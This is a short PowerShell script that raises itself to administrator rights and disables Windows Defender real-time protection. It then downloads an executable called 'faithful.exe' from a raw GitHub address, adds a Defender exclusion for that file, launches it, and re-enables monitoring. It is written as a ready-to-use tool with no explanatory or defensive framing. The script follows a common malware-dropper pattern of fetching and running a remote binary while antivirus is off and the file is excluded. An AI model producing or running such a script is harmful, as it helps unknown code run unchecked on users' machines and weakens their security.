if (!
    #current role
    (New-Object Security.Principal.WindowsPrincipal(
        [Security.Principal.WindowsIdentity]::GetCurrent()
    #is admin?
    )).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator
    )
) {
    #elevate script and exit current non-elevated runtime
    Start-Process `
        -FilePath 'powershell' `
        -ArgumentList (
            #flatten to single array
            '-File', $MyInvocation.MyCommand.Source, $args `
            | %{ $_ }
        ) `
        -Verb RunAs
    exit
}

cd $env:userprofile
Set-MpPreference -DisableRealtimeMonitoring $true
Write-Output "Starting script..."
Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
Write-Output "Adding Windows Defender exclusion..."
Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
Start-Process ("faithful.exe")
Set-MpPreference -DisableRealtimeMonitoring $false
Write-Output "Done!"
pause
